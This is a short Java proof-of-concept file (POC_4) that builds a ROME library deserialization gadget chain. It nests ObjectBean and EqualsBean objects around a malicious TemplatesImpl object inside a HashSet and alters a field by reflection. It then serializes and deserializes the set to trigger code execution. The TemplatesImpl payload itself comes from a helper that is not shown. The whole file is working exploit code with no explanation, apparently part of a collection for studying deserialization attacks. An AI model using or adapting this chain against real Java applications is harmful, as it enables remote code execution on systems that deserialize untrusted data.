package com.example.Rome;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;
import java.util.HashSet;

public class POC_4 {

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();

        ObjectBean delegate = new ObjectBean(Templates.class, tmpl);

        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "str"));

        HashSet set = new HashSet<>();
        set.add(root);

        ReflectionUtil.setField(root, "_equalsBean", new EqualsBean(ObjectBean.class, delegate));

        SerializeUtil.deserialize(SerializeUtil.serialize(set));
    }

}
